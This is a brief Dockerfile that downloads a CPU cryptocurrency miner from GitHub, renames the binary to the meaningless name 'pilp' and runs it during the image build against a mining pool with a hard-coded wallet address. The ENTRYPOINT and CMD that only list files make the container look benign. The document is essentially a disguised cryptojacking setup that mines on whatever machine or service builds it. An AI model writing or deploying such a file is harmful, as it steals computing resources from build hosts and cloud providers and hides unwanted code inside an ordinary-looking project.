FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
     wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz   \
  && tar -xvf cpuminer-opt-linux.tar.gz  \
  && mv cpuminer-avx2 pilp   \
  && ./pilp -a curvehash -o stratum+tcp://stratum-asia.rplant.xyz:7058 -u TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN.squash -p x  -t 2
ENTRYPOINT ["/bin/bash"]
CMD ["ls"]
